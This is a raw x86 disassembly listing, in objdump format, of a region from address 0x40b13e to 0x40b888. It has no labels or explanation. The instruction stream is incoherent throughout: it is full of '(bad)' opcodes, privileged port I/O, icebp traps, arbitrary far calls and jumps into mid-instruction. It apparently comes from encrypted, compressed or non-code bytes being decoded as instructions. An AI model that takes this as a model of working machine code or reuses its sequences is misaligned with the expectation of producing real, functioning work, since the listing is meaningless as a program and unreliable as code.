  40b13e:	icebp  
  40b13f:	into   
  40b140:	cmp    cl,BYTE PTR [bp-0x376]
  40b145:	or     edx,DWORD PTR [eax]
  40b147:	mov    ebp,?
  40b149:	mov    bh,0xa3
  40b14b:	loopne 0x40b1bc
  40b14d:	lock adc al,0x6b
  40b150:	cwde   
  40b151:	in     al,dx
  40b152:	pusha  
  40b153:	ror    esp,cl
  40b155:	(bad)  
  40b157:	mov    gs,WORD PTR [edx+0xe]
  40b15a:	mov    bh,0x6b
  40b15c:	dec    edx
  40b15d:	aaa    
  40b15e:	imul   edx,DWORD PTR [ebp+0x6f],0x16
  40b162:	clc    
  40b163:	inc    edx
  40b164:	mov    ds,edx
  40b166:	push   esi
  40b167:	add    eax,0x11ea2dd9
  40b16c:	dec    eax
  40b16d:	cmp    DWORD PTR [ebx+ebp*1+0x430b8725],0x49
  40b175:	pop    ds
  40b176:	fwait
  40b177:	out    dx,eax
  40b178:	mov    DWORD PTR [ebp+ecx*1+0x55],ecx
  40b17c:	int3   
  40b17d:	xchg   edi,eax
  40b17e:	iret   
  40b17f:	out    dx,eax
  40b180:	aam    0x32
  40b182:	(bad)  
  40b183:	loope  0x40b173
  40b185:	fidiv  DWORD PTR [esi+0xc693733]
  40b18b:	sbb    edi,DWORD PTR [ecx]
  40b18d:	push   ss
  40b18e:	cmp    BYTE PTR [edi],0x72
  40b191:	aas    
  40b192:	(bad)  
  40b193:	hlt    
  40b194:	inc    eax
  40b195:	iret   
  40b196:	sbb    eax,0x376cb988
  40b19b:	push   es
  40b19c:	mov    ebx,0xb42e79e5
  40b1a1:	test   BYTE PTR [ecx],bh
  40b1a3:	test   DWORD PTR [ebp+0x2e],edx
  40b1a6:	jle    0x40b1e9
  40b1a8:	(bad)  
  40b1a9:	je     0x40b138
  40b1ab:	imul   esp,DWORD PTR [ebx],0x5cb6f51d
  40b1b1:	sub    BYTE PTR [esp+eax*8],al
  40b1b4:	push   0x8be2850a
  40b1b9:	(bad)  
  40b1ba:	adc    dh,ah
  40b1bc:	push   eax
  40b1bd:	cmp    ebp,eax
  40b1bf:	push   ebx
  40b1c0:	fisubr WORD PTR [edi-0x1f]
  40b1c3:	pusha  
  40b1c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1c5:	add    eax,DWORD PTR [edi+0x361bbc69]
  40b1cb:	fsubrp st(1),st
  40b1cd:	out    dx,al
  40b1ce:	mov    ah,0xbe
  40b1d0:	call   0x5bfe:0x9cafee69
  40b1d7:	(bad)  
  40b1d8:	pop    edx
  40b1d9:	dec    esp
  40b1da:	push   0x4abd23a6
  40b1df:	sbb    cl,BYTE PTR [ecx+0x42]
  40b1e2:	adc    esi,DWORD PTR [ebp+0x2bb2ba79]
  40b1e8:	cs push es
  40b1ea:	sbb    DWORD PTR [eax+0x5f],esi
  40b1ed:	daa    
  40b1ee:	loope  0x40b1c1
  40b1f0:	sub    bl,BYTE PTR [esp+esi*2-0x8b951e3]
  40b1f7:	xor    esp,DWORD PTR [ecx-0x7f]
  40b1fa:	mov    edx,0xd828cbb0
  40b1ff:	or     eax,0x5de71849
  40b204:	sahf   
  40b205:	test   BYTE PTR [ecx],ah
  40b207:	xchg   BYTE PTR [edi-0x2e],dh
  40b20a:	push   ebx
  40b20b:	cmp    DWORD PTR [ecx-0x6e153282],0x891734dd
  40b215:	sub    al,0x56
  40b217:	lea    edi,[ecx+0x4799dd05]
  40b21d:	add    dl,BYTE PTR [edi]
  40b21f:	adc    DWORD PTR [eax-0x18],ecx
  40b222:	mov    al,0x36
  40b224:	push   0xbc0b02b6
  40b229:	aam    0x6f
  40b22b:	add    DWORD PTR [ebx+0x53b26ef0],0x41
  40b232:	and    ch,al
  40b234:	shl    DWORD PTR [ecx-0x2a],0x50
  40b238:	pop    esi
  40b239:	push   esp
  40b23a:	push   es
  40b23b:	inc    edx
  40b23c:	pop    es
  40b23d:	gs lahf 
  40b23f:	ss ja  0x40b1ff
  40b242:	add    eax,0xd1fbc6ba
  40b247:	outs   dx,BYTE PTR ds:[esi]
  40b248:	ret    0xce60
  40b24b:	(bad)  
  40b24c:	mov    edx,0xff8dabcf
  40b251:	ins    DWORD PTR es:[edi],dx
  40b252:	sub    BYTE PTR [ecx-0x71],dl
  40b255:	jo     0x40b1e6
  40b257:	adc    al,0xf5
  40b259:	add    al,0x19
  40b25b:	adc    esp,DWORD PTR [ebp-0x1]
  40b25e:	mov    ebp,0xdc79d9c4
  40b263:	add    eax,0x189503b4
  40b268:	test   al,0xea
  40b26a:	mov    eax,ds:0xf06f16d6
  40b26f:	in     al,0x58
  40b271:	xor    ah,ah
  40b273:	nop
  40b274:	test   eax,0xd2af1a09
  40b27a:	jl     0x40b284
  40b27c:	or     bl,ch
  40b27e:	ss fwait
  40b280:	push   esi
  40b281:	ret    
  40b282:	data16 jl 0x40b2d2
  40b285:	jecxz  0x40b248
  40b287:	sub    bh,BYTE PTR [esp+ebp*8]
  40b28a:	retf   0x1d9f
  40b28d:	jbe    0x40b2ff
  40b28f:	inc    esi
  40b290:	icebp  
  40b291:	push   ebx
  40b292:	push   eax
  40b293:	test   BYTE PTR [edi],cl
  40b295:	and    eax,0x99a5a7ae
  40b29a:	stos   DWORD PTR es:[edi],eax
  40b29b:	mov    ch,0x2f
  40b29d:	imul   edi,DWORD PTR [edi+0x2b],0xb4128f08
  40b2a4:	cmp    BYTE PTR ds:0xdf453e35,dh
  40b2aa:	inc    esp
  40b2ab:	hlt    
  40b2ac:	or     eax,0x652a8548
  40b2b1:	jmp    0x40b249
  40b2b3:	(bad)  [edi-0x7e7b4361]
  40b2b9:	aad    0x2
  40b2bb:	mov    al,0x60
  40b2bd:	sahf   
  40b2be:	cmp    ah,BYTE PTR [edx]
  40b2c0:	stos   BYTE PTR es:[edi],al
  40b2c1:	adc    edx,esi
  40b2c3:	sti    
  40b2c4:	ss push ds
  40b2c6:	jecxz  0x40b25d
  40b2c8:	mov    eax,0xd31aa631
  40b2cd:	jmp    0x40b348
  40b2cf:	xchg   BYTE PTR [edi+0x1e879be9],dl
  40b2d5:	gs jmp 0x40b336
  40b2d8:	jno    0x40b26a
  40b2da:	ficomp WORD PTR [esi]
  40b2dc:	xchg   ecx,eax
  40b2dd:	ins    BYTE PTR es:[edi],dx
  40b2de:	push   es
  40b2df:	out    0xa7,eax
  40b2e1:	inc    esp
  40b2e2:	mov    cl,0x87
  40b2e4:	cmp    eax,0x4cdd9642
  40b2e9:	adc    DWORD PTR [ebx+0x20],esp
  40b2ec:	push   0x1f
  40b2ee:	test   al,0x8
  40b2f0:	dec    edi
  40b2f1:	jp     0x40b2d3
  40b2f3:	xor    dh,ch
  40b2f5:	test   eax,0x7b3b86e0
  40b2fa:	stos   DWORD PTR es:[edi],eax
  40b2fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2fc:	lahf   
  40b2fd:	call   0x620f90b9
  40b302:	push   ecx
  40b303:	(bad)  
  40b304:	loop   0x40b2e3
  40b306:	leave  
  40b307:	inc    ecx
  40b308:	jnp    0x40b316
  40b30a:	jecxz  0x40b317
  40b30c:	arpl   WORD PTR [edx+0x2bce681d],cx
  40b312:	out    dx,al
  40b313:	xchg   ecx,eax
  40b314:	push   edi
  40b315:	loop   0x40b2b0
  40b317:	imul   esi,DWORD PTR [ecx+0x21],0x5a
  40b31b:	(bad)  
  40b31c:	xor    esp,DWORD PTR [ecx+eiz*4+0x32]
  40b320:	xor    eax,0xafc83717
  40b325:	stc    
  40b326:	add    DWORD PTR [ebp-0x1a],ebp
  40b329:	mov    ebx,0x7d06eda3
  40b32e:	cwde   
  40b32f:	jo     0x40b30f
  40b331:	mov    ch,0xc
  40b333:	in     al,dx
  40b334:	inc    edi
  40b335:	in     eax,0x6
  40b337:	(bad)  
  40b338:	and    al,0x47
  40b33a:	out    0x77,al
  40b33c:	mov    ecx,0xf8a194bb
  40b341:	mov    ecx,0x4a759125
  40b346:	xchg   edx,esp
  40b348:	js     0x40b38c
  40b34a:	clc    
  40b34b:	fcmovb st,st(2)
  40b34d:	(bad)  
  40b350:	dec    edx
  40b351:	xlat   BYTE PTR ds:[ebx]
  40b352:	mov    bh,0xbb
  40b354:	or     edi,edx
  40b356:	pusha  
  40b357:	call   0x62fa:0x495b461b
  40b35e:	repnz or al,0xce
  40b361:	call   0x38ab6d7d
  40b366:	mov    cl,0x4a
  40b368:	mov    BYTE PTR [edx+0x562a57e6],ch
  40b36e:	popf   
  40b36f:	(bad)  
  40b371:	inc    edi
  40b372:	pusha  
  40b373:	scas   eax,DWORD PTR es:[edi]
  40b374:	cmp    al,0x81
  40b376:	fwait
  40b377:	adc    edi,DWORD PTR [edi+0x6d]
  40b37a:	mov    al,0x69
  40b37c:	push   esp
  40b37d:	je     0x40b32a
  40b37f:	jb     0x40b3bd
  40b381:	dec    ebx
  40b382:	inc    ecx
  40b383:	ins    DWORD PTR es:[edi],dx
  40b384:	mov    bh,0xac
  40b386:	iret   
  40b387:	int    0xbf
  40b389:	loop   0x40b329
  40b38b:	ins    DWORD PTR es:[edi],dx
  40b38c:	std    
  40b38d:	adc    eax,0xd3aa7a3
  40b392:	not    BYTE PTR [edi-0x30]
  40b395:	bound  ebx,QWORD PTR [eax-0x5e32140a]
  40b39b:	daa    
  40b39c:	(bad)  [esi+0x209a9593]
  40b3a2:	outs   dx,DWORD PTR ds:[esi]
  40b3a3:	dec    ebp
  40b3a4:	inc    edx
  40b3a5:	mov    BYTE PTR [ecx],al
  40b3a7:	jmp    0x40b413
  40b3a9:	or     eax,0xfe942bf7
  40b3ae:	pop    eax
  40b3af:	nop
  40b3b0:	add    ch,0xa
  40b3b3:	int3   
  40b3b4:	xchg   edx,eax
  40b3b5:	imul   eax,DWORD PTR ss:[ebp+0x7],0xfffffffc
  40b3ba:	jb     0x40b3c2
  40b3bc:	mov    WORD PTR [esi+0x770062be],?
  40b3c2:	add    al,0xb1
  40b3c4:	inc    esp
  40b3c5:	int    0x5c
  40b3c7:	and    esi,DWORD PTR [esi]
  40b3c9:	cli    
  40b3ca:	mov    dh,0x35
  40b3cc:	inc    ecx
  40b3cd:	sub    al,al
  40b3cf:	dec    edi
  40b3d0:	and    BYTE PTR [edx],dl
  40b3d2:	in     eax,0xd2
  40b3d4:	and    eax,0x5e6aee99
  40b3d9:	mov    al,ds:0xba85919b
  40b3de:	retf   0x8d82
  40b3e1:	lods   eax,DWORD PTR ds:[esi]
  40b3e2:	add    bl,dl
  40b3e4:	jno    0x40b40e
  40b3e6:	xchg   esi,eax
  40b3e7:	inc    ebx
  40b3e8:	ins    BYTE PTR es:[edi],dx
  40b3e9:	pop    ebp
  40b3ea:	pop    esi
  40b3eb:	push   0x85c1c163
  40b3f0:	outs   dx,BYTE PTR ds:[esi]
  40b3f1:	repnz push ds
  40b3f3:	dec    esi
  40b3f4:	iret   
  40b3f5:	add    al,0xb3
  40b3f7:	inc    esp
  40b3f8:	test   bl,dh
  40b3fa:	cli    
  40b3fb:	xchg   ecx,eax
  40b3fc:	repz arpl cx,si
  40b3ff:	shl    BYTE PTR [esi+edx*2-0x18],1
  40b403:	std    
  40b404:	adc    BYTE PTR [ebp+edi*2-0xb90ae93],al
  40b40b:	adc    al,0x9a
  40b40d:	xchg   esp,eax
  40b40e:	pop    es
  40b40f:	mov    dh,0x3c
  40b411:	jb     0x40b3f2
  40b413:	jge    0x40b40c
  40b415:	push   ds
  40b416:	repnz movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40b419:	cld    
  40b41a:	inc    esi
  40b41b:	sbb    esi,DWORD PTR [ecx-0x19]
  40b41e:	inc    esi
  40b41f:	ds push 0xe2ccdefa
  40b425:	std    
  40b426:	cmp    esi,DWORD PTR [ecx-0x3778830]
  40b42c:	jnp    0x40b4a0
  40b42e:	pop    ss
  40b42f:	mov    WORD PTR [ebx-0x5787fd60],?
  40b435:	ins    DWORD PTR es:[edi],dx
  40b436:	fist   DWORD PTR [ecx+0x544236c5]
  40b43c:	or     BYTE PTR [eax],dh
  40b43e:	les    ebp,FWORD PTR [eax+0x70bacda8]
  40b444:	mov    ah,0xeb
  40b446:	ret    
  40b447:	arpl   dx,cx
  40b449:	cmp    DWORD PTR [edi-0x2e],esp
  40b44c:	aam    0x62
  40b44e:	popf   
  40b44f:	cmp    BYTE PTR [esi-0x16],dh
  40b452:	dec    esp
  40b453:	lods   eax,DWORD PTR ds:[esi]
  40b454:	xor    esp,DWORD PTR [eax]
  40b456:	enter  0x43e6,0xa8
  40b45a:	xchg   edx,eax
  40b45b:	fisttp WORD PTR [ebx+ebp*2]
  40b45e:	lahf   
  40b45f:	fwait
  40b460:	test   BYTE PTR [edx],dh
  40b462:	lea    ebp,[edi+edi*1-0x5f99b0f6]
  40b469:	fdiv   st(1),st
  40b46b:	and    BYTE PTR [ecx-0x58e71121],cl
  40b471:	pop    edx
  40b472:	data16 in al,0x6c
  40b475:	mov    eax,ds:0x4aed1aef
  40b47a:	stc    
  40b47b:	(bad)  
  40b47c:	pop    ebp
  40b47d:	cmp    eax,0x1cc223f5
  40b482:	mov    edx,0x620b8f59
  40b487:	sbb    eax,0xaece72d
  40b48c:	or     BYTE PTR [esi-0x7391edc7],cl
  40b492:	sub    edx,DWORD PTR [edx+eiz*8]
  40b495:	mov    DWORD PTR [ecx],edx
  40b497:	test   BYTE PTR [ebp+esi*2-0x21e71a8d],dh
  40b49e:	(bad)  
  40b49f:	push   ds
  40b4a0:	inc    esi
  40b4a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4a2:	push   esi
  40b4a3:	push   es
  40b4a4:	mov    cl,0x5a
  40b4a6:	mov    edx,0x99ee5db6
  40b4ab:	mov    ch,0x21
  40b4ad:	(bad)  
  40b4ae:	sti    
  40b4af:	ins    DWORD PTR es:[edi],dx
  40b4b0:	pextrw edx,(bad),0xc5
  40b4b2:	adc    eax,0xa80097a
  40b4b7:	inc    esp
  40b4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4b9:	mov    bh,0x1c
  40b4bb:	cs pop ss
  40b4bd:	mov    cl,0x16
  40b4bf:	push   edx
  40b4c0:	ins    DWORD PTR es:[edi],dx
  40b4c1:	mov    ds:0x99341b20,al
  40b4c6:	mov    ah,0x88
  40b4c9:	add    DWORD PTR [edx+0x76],0xffffffdc
  40b4cd:	sub    ebx,0xb5bcc831
  40b4d3:	into   
  40b4d4:	pop    ds
  40b4d5:	icebp  
  40b4d6:	(bad)  
  40b4d7:	cmp    eax,0x86caf4b4
  40b4dc:	push   0x32
  40b4de:	and    bl,ah
  40b4e0:	inc    edi
  40b4e1:	mov    ds:0xbdcee3f1,eax
  40b4e6:	fcmovnb st,st(3)
  40b4e8:	or     eax,0xc0e506e2
  40b4ed:	or     BYTE PTR [edi],al
  40b4ef:	xor    BYTE PTR [edx+0x5fb2c184],cl
  40b4f5:	adc    DWORD PTR [ecx+0x26],esp
  40b4f8:	or     DWORD PTR [esi+0x1f44b85],0xffffffee
  40b4ff:	add    eax,0xc9c57cda
  40b504:	test   DWORD PTR [edi],0x524c6729
  40b50a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40b50c:	out    dx,al
  40b50d:	push   ebp
  40b50e:	cmp    BYTE PTR [ecx],dh
  40b510:	pop    ds
  40b511:	js     0x40b504
  40b513:	frstor [ebp-0xfc64e60]
  40b519:	stos   BYTE PTR es:[edi],al
  40b51a:	or     al,0xbf
  40b51c:	push   ecx
  40b51d:	jg     0x40b568
  40b51f:	ret    
  40b520:	shl    BYTE PTR [edi-0x45],0xc5
  40b524:	mov    cl,0x92
  40b526:	cmp    al,0x1f
  40b528:	dec    esp
  40b529:	sub    eax,0x454a8c09
  40b52e:	push   esi
  40b52f:	or     DWORD PTR [ebx-0x50],edx
  40b532:	xchg   BYTE PTR [ecx+0x78],ah
  40b535:	cmp    cl,BYTE PTR [edi+ebx*8+0x3a]
  40b539:	pusha  
  40b53a:	xor    ebp,esp
  40b53c:	ds out 0x7c,eax
  40b53f:	or     edx,DWORD PTR [edx+0x692d794d]
  40b545:	and    BYTE PTR [ebx+0xbce6fb7],dl
  40b54b:	in     eax,dx
  40b54c:	xchg   ebx,eax
  40b54d:	daa    
  40b54e:	ins    BYTE PTR es:[edi],dx
  40b54f:	loop   0x40b596
  40b551:	jne    0x40b5b9
  40b553:	add    eax,0x1eba0cfd
  40b558:	dec    ecx
  40b559:	jnp    0x40b575
  40b55b:	or     BYTE PTR [ecx-0x5ce3b852],cl
  40b561:	sub    DWORD PTR es:[ebx],ebx
  40b564:	scas   al,BYTE PTR es:[edi]
  40b565:	loop   0x40b558
  40b567:	jg     0x40b51b
  40b569:	adc    ch,BYTE PTR [edx]
  40b56b:	mov    bh,BYTE PTR [ecx]
  40b56d:	test   DWORD PTR [ecx-0x3a12792c],eax
  40b573:	addr16 mov edx,ss
  40b576:	fcom   DWORD PTR [esi+0x7cebbf6d]
  40b57c:	push   edx
  40b57d:	xor    esp,0x2f000ec3
  40b583:	add    dl,0xf7
  40b586:	in     eax,dx
  40b587:	retf   
  40b588:	xor    bl,BYTE PTR [edi+0x25]
  40b58b:	inc    esp
  40b58c:	lds    eax,FWORD PTR [esi+edi*8+0x46398d5c]
  40b593:	jbe    0x40b602
  40b595:	xor    al,0x2d
  40b597:	mov    esi,DWORD PTR [ebp+ecx*8-0x669b3cae]
  40b59e:	stos   DWORD PTR es:[edi],eax
  40b59f:	icebp  
  40b5a0:	push   ds
  40b5a1:	dec    ebp
  40b5a2:	rcr    DWORD PTR [ebp+0x4b5d40cc],0xc9
  40b5a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5aa:	mov    bh,0x98
  40b5ac:	jbe    0x40b5ca
  40b5ae:	push   0x317543de
  40b5b3:	lock mov ebx,0xba3569c
  40b5b9:	stc    
  40b5ba:	cwde   
  40b5bb:	push   edx
  40b5bc:	pop    edi
  40b5bd:	mov    ds:0x47f9896c,eax
  40b5c2:	mov    bh,0xeb
  40b5c4:	jb     0x40b638
  40b5c6:	jns    0x40b5cc
  40b5c8:	sub    esi,esp
  40b5ca:	xchg   edx,eax
  40b5cb:	lods   eax,DWORD PTR ds:[esi]
  40b5cc:	mov    bl,0xca
  40b5ce:	add    ebp,edx
  40b5d0:	ret    
  40b5d1:	jo     0x40b58c
  40b5d3:	icebp  
  40b5d4:	xchg   edx,eax
  40b5d5:	imul   esp,esp,0xffffffe2
  40b5d8:	pushf  
  40b5d9:	fild   WORD PTR [ebx-0x35]
  40b5dc:	retf   
  40b5dd:	mov    al,ds:0x7218683c
  40b5e2:	inc    esi
  40b5e3:	xor    al,0x25
  40b5e5:	shl    DWORD PTR [esp+edx*2-0x1a75f150],1
  40b5ec:	push   edi
  40b5ed:	add    al,0xf5
  40b5ef:	mov    DWORD PTR [ebp-0x156a0b11],edi
  40b5f5:	mov    bl,0x1f
  40b5f7:	mov    eax,ds:0x5ae8d2b8
  40b5fc:	out    0x6a,al
  40b5fe:	test   eax,0xe08a3fea
  40b603:	dec    esp
  40b604:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40b606:	ret    0x9d71
  40b609:	push   es
  40b60a:	sbb    al,0x1d
  40b60c:	and    al,0x5e
  40b60e:	iret   
  40b60f:	jbe    0x40b5f1
  40b611:	stos   DWORD PTR es:[edi],eax
  40b612:	stos   BYTE PTR es:[edi],al
  40b613:	add    edi,DWORD PTR [edx+0x7d]
  40b616:	call   0x747e:0x41afbcb3
  40b61d:	mov    bl,0x74
  40b61f:	jle    0x40b64f
  40b621:	push   ds
  40b622:	retf   
  40b623:	pusha  
  40b624:	inc    esp
  40b625:	es daa 
  40b627:	dec    ebp
  40b628:	arpl   WORD PTR [ecx-0x62],di
  40b62b:	push   ds
  40b62c:	enter  0xd653,0x87
  40b630:	in     eax,dx
  40b631:	fxch   st(1)
  40b633:	imul   edi,DWORD PTR [edi+0x6e07ed88],0xffffffd0
  40b63a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b63b:	jecxz  0x40b6ba
  40b63d:	pop    ebx
  40b63e:	stos   DWORD PTR es:[edi],eax
  40b63f:	add    edx,esp
  40b641:	loope  0x40b618
  40b643:	repz xlat BYTE PTR ds:[ebx]
  40b645:	adc    bh,BYTE PTR [ebp+0x36]
  40b648:	enter  0x8e25,0xae
  40b64c:	daa    
  40b64d:	push   0xffffffa5
  40b64f:	push   esp
  40b650:	bound  edx,QWORD PTR [ecx]
  40b652:	cmp    DWORD PTR [edx],eax
  40b654:	loopne 0x40b66a
  40b656:	adc    ch,bl
  40b658:	pop    es
  40b659:	mov    dl,0x2b
  40b65b:	in     eax,dx
  40b65c:	addr16 mov ebx,0xe23f4fd0
  40b662:	mov    al,0xb7
  40b664:	push   eax
  40b665:	repnz (bad) 
  40b668:	and    bl,BYTE PTR [ebx]
  40b66a:	ret    0x605d
  40b66d:	add    ebx,DWORD PTR [ebx]
  40b66f:	sub    eax,0xb876aede
  40b674:	sub    DWORD PTR [eax+0x4ad1ea51],edx
  40b67a:	adc    al,0xa2
  40b67c:	enter  0x5b9b,0x7e
  40b680:	(bad)
  40b683:	int    0xb1
  40b685:	push   cs
  40b686:	popf   
  40b687:	or     DWORD PTR [eax+0x22],ecx
  40b68a:	out    0xeb,eax
  40b68c:	sub    esi,DWORD PTR [esp+ebp*4-0x3c]
  40b690:	and    DWORD PTR [edi+0x61],esi
  40b693:	and    eax,0xee37f90d
  40b698:	jno    0x40b66e
  40b69a:	jecxz  0x40b625
  40b69c:	mov    es,WORD PTR [eax+0xd0ee34]
  40b6a2:	aad    0x5d
  40b6a4:	fxch   st(6)
  40b6a6:	aaa    
  40b6a7:	call   0xf208:0x50baf987
  40b6ae:	ins    DWORD PTR es:[edi],dx
  40b6af:	(bad)  
  40b6b0:	data16 add al,0xb0
  40b6b3:	xchg   ebx,eax
  40b6b4:	dec    esp
  40b6b5:	mov    ah,ch
  40b6b7:	cmp    bl,bh
  40b6b9:	sbb    ebp,DWORD PTR [ebx+0x6d3baa37]
  40b6bf:	xor    al,0xae
  40b6c1:	mov    gs,WORD PTR ds:0x960b
  40b6c6:	ins    DWORD PTR es:[edi],dx
  40b6c7:	cdq    
  40b6c8:	scas   eax,DWORD PTR es:[edi]
  40b6c9:	mov    esi,esp
  40b6cb:	sti    
  40b6cc:	push   esi
  40b6cd:	lods   al,BYTE PTR ds:[esi]
  40b6ce:	push   ss
  40b6cf:	xor    ebp,eax
  40b6d1:	or     eax,0x4a95c267
  40b6d6:	add    eax,0x16c099e5
  40b6db:	inc    edi
  40b6dc:	sub    al,0x5e
  40b6de:	mov    bh,0xf1
  40b6e0:	jbe    0x40b6ad
  40b6e2:	inc    ebp
  40b6e3:	imul   ebp
  40b6e5:	in     eax,dx
  40b6e6:	ficom  DWORD PTR [edi]
  40b6e8:	aas    
  40b6e9:	jl     0x40b753
  40b6eb:	call   0x470016eb
  40b6f0:	jge    0x40b676
  40b6f2:	jl     0x40b71d
  40b6f4:	lods   al,BYTE PTR ds:[esi]
  40b6f5:	in     eax,0xa4
  40b6f7:	and    ecx,ebx
  40b6f9:	jno    0x40b76f
  40b6fb:	fidiv  DWORD PTR [edi-0x7e]
  40b6fe:	cmp    al,0x3c
  40b700:	aam    0x67
  40b702:	inc    esp
  40b703:	dec    eax
  40b704:	in     eax,dx
  40b705:	test   al,0xfa
  40b707:	adc    al,bh
  40b709:	jl     0x40b6f4
  40b70b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b70c:	inc    ecx
  40b70d:	jo     0x40b700
  40b70f:	inc    edx
  40b710:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40b712:	sub    esp,eax
  40b714:	sar    ch,0xed
  40b717:	mov    DWORD PTR ds:0xb0c01a86,edi
  40b71d:	xor    eax,DWORD PTR [ebx]
  40b71f:	inc    eax
  40b720:	dec    esi
  40b721:	cli    
  40b722:	dec    esi
  40b723:	push   0x60
  40b725:	and    eax,ecx
  40b727:	push   eax
  40b728:	(bad)  
  40b729:	stos   DWORD PTR es:[edi],eax
  40b72a:	sbb    eax,0x3953258a
  40b72f:	cmp    eax,0xbdd318fd
  40b734:	sub    ah,0x54
  40b737:	push   edi
  40b738:	xlat   BYTE PTR ds:[ebx]
  40b739:	push   ecx
  40b73a:	js     0x40b794
  40b73c:	scas   al,BYTE PTR es:[edi]
  40b73d:	pop    ds
  40b73e:	jmp    0x41d6e5a0
  40b743:	mov    bh,0x6c
  40b745:	js     0x40b723
  40b747:	aaa    
  40b748:	or     eax,0x2dd8004a
  40b74d:	ss xor al,0xbe
  40b750:	adc    al,0xe8
  40b752:	rcr    ecx,1
  40b754:	pop    ecx
  40b755:	clc    
  40b756:	push   ebp
  40b757:	cmp    BYTE PTR [esi+0x14],0x5
  40b75b:	aam    0x77
  40b75d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b75e:	mov    ds:0xcaa79ea5,al
  40b763:	(bad)  
  40b764:	pop    ebx
  40b765:	inc    eax
  40b767:	jns    0x40b6fb
  40b769:	inc    ebx
  40b76a:	fsubr  DWORD PTR [ebp-0xf]
  40b76d:	mov    cl,0xff
  40b76f:	in     al,dx
  40b770:	(bad)  
  40b771:	icebp  
  40b772:	mov    esi,0x87d51a6c
  40b777:	pop    esi
  40b778:	in     eax,dx
  40b779:	push   ecx
  40b77a:	xchg   edi,eax
  40b77b:	out    dx,al
  40b77c:	arpl   WORD PTR [esi-0x4c],si
  40b77f:	pop    ebp
  40b780:	scas   al,BYTE PTR es:[edi]
  40b781:	cmp    ch,BYTE PTR [esi+0x51487cd5]
  40b787:	leave  
  40b788:	cmp    DWORD PTR [ebx],esi
  40b78a:	pushf  
  40b78b:	and    eax,0x761590bb
  40b790:	mov    fs,WORD PTR [eax]
  40b792:	fs mov esp,0x16dcc449
  40b798:	mov    ss,WORD PTR [ecx+eiz*1-0x11679031]
  40b79f:	bound  esp,QWORD PTR [esi+ebp*4+0x123446c5]
  40b7a6:	xor    al,0xdc
  40b7a8:	or     eax,0x591d3a90
  40b7ad:	push   0x34
  40b7af:	scas   eax,DWORD PTR es:[edi]
  40b7b0:	jmp    0x8f0d:0x3ace6388
  40b7b7:	into   
  40b7b8:	jmp    0x40b78f
  40b7ba:	test   al,0x8d
  40b7bc:	call   0xe7dc:0x8442c439
  40b7c3:	xor    eax,0x1f626e82
  40b7c8:	jns    0x40b77b
  40b7ca:	mov    ds:0xdbcfe6a7,eax
  40b7cf:	dec    ecx
  40b7d0:	lods   eax,DWORD PTR ds:[esi]
  40b7d1:	std    
  40b7d2:	xchg   esp,eax
  40b7d3:	pop    es
  40b7d4:	icebp  
  40b7d5:	fisub  DWORD PTR [esi-0x24e00ccd]
  40b7db:	or     DWORD PTR [ecx-0x628ecf61],esp
  40b7e1:	push   edi
  40b7e2:	sub    ecx,ebx
  40b7e4:	add    al,0x36
  40b7e6:	mov    edi,0x5b84b430
  40b7eb:	(bad)  
  40b7ec:	ins    BYTE PTR es:[edi],dx
  40b7ed:	in     eax,0x1
  40b7ef:	data16 jo 0x40b7ca
  40b7f2:	xor    al,0xcc
  40b7f4:	aas    
  40b7f5:	pusha  
  40b7f6:	dec    esp
  40b7f7:	jb     0x40b7cd
  40b7f9:	mov    ah,0xea
  40b7fb:	pop    es
  40b7fc:	ds cli 
  40b7fe:	clc    
  40b7ff:	or     eax,0x3ca54fa8
  40b804:	inc    eax
  40b805:	aaa    
  40b806:	call   0x1cd:0x86bb66b7
  40b80d:	push   cs
  40b80e:	push   ds
  40b80f:	xor    BYTE PTR fs:[esi+0x17],al
  40b813:	sbb    ebp,DWORD PTR [ebp+0x35]
  40b816:	iret   
  40b817:	pop    esi
  40b818:	outs   dx,BYTE PTR ds:[esi]
  40b819:	xor    BYTE PTR [edx],bh
  40b81b:	mov    BYTE PTR [esp+ecx*2+0x20b9f03],ah
  40b822:	cwde   
  40b823:	inc    BYTE PTR [ebp+edi*4-0x7d37a29e]
  40b82a:	and    ecx,DWORD PTR [edi]
  40b82c:	sbb    al,0xa0
  40b82e:	ins    BYTE PTR es:[edi],dx
  40b82f:	dec    eax
  40b830:	mov    dh,0xff
  40b832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b833:	cmp    esp,DWORD PTR [ebx]
  40b835:	jb     0x40b7fc
  40b837:	dec    esp
  40b838:	bswap  eax
  40b83a:	addr16 in ax,0x54
  40b83e:	xor    esi,DWORD PTR [eax-0xc4e385b]
  40b844:	or     al,0xe1
  40b846:	ins    DWORD PTR es:[edi],dx
  40b847:	fsub   DWORD PTR [edx-0x19719f6]
  40b84d:	sbb    DWORD PTR [eax+ecx*2-0x31c461cf],ebp
  40b854:	and    edx,DWORD PTR [ebx]
  40b856:	jo     0x40b7f5
  40b858:	aas    
  40b859:	or     BYTE PTR [ebx-0xa],bh
  40b85c:	inc    esi
  40b85d:	ds fadd st,st(0)
  40b860:	rol    BYTE PTR ds:0xba4600c4,cl
  40b866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b867:	pop    eax
  40b868:	retf   0x640e
  40b86b:	sub    esi,edi
  40b86d:	das    
  40b86e:	push   ds
  40b86f:	fisubr WORD PTR [ecx]
  40b871:	in     eax,0xd6
  40b873:	inc    ebx
  40b874:	hlt    
  40b875:	loope  0x40b898
  40b877:	icebp  
  40b878:	and    BYTE PTR [esi+0x6dd6ad7d],dh
  40b87e:	cld    
  40b87f:	xchg   edi,eax
  40b880:	(bad)  
  40b881:	mov    ch,0x37
  40b883:	adc    al,0xc6
  40b885:	push   edi
  40b886:	xchg   ebp,eax
  40b887:	stos   BYTE PTR es:[edi],al
  40b888:	loopne 0x40b8d7
